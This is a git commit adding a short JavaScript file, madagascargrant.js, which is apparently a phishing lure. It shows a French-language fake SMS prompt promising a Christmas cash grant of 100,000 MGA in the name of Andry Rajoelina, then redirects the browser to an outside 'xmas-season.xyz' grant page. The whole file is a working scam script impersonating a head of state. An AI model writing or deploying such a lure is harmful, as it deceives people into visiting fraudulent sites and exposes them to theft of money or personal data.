6451fcd44319b4ff07f024047d4b1202a98ec24d
bigetijazz14 <bigetijazz14@gmail.com>
2024-11-27 16:32:20 -0800

    Create madagascargrant.js

---
+++ madagascargrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMER 100,000 MGA'
+password=prompt('SMS: Félicitations, vous êtes admissible à ANDRY RAJOELINA 100,000 MGA SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 100,000 MGA');
+if (password != 'RECLAMER 100,000 MGA') {
+location.href='https://www.xmas-season.xyz/100000MGA-subvention';
+}
